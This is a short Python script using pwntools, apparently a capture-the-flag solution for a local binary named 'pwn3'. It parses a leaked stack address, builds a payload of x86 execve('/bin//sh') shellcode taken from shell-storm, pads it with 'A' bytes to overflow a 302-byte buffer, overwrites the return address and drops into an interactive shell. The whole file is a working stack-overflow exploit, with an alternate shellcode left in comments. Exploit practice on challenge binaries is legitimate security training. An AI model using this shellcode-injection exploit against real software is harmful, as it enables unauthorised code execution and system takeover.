from pwn import *

context.terminal = [ "wt.exe", "-w", "0", "sp", "--", "wsl.exe", "--" ]
target = process("./pwn3")
# target = gdb.debug("./pwn3", "start")
target.recvuntil(b"journey ")
str = int(target.recvline().strip()[:-1], 16)
print(hex(str))
# f = open("test.bin", "rb")
# payload = f.read()
# print(payload)
# payload = b""
# 
# payload = b"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
# https://shell-storm.org/shellcode/files/shellcode-841.html
payload = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

assert(len(payload) <= 302)
payload += (302 - len(payload)) * b"A"
payload += p32(str)
target.sendline(payload)
target.interactive()
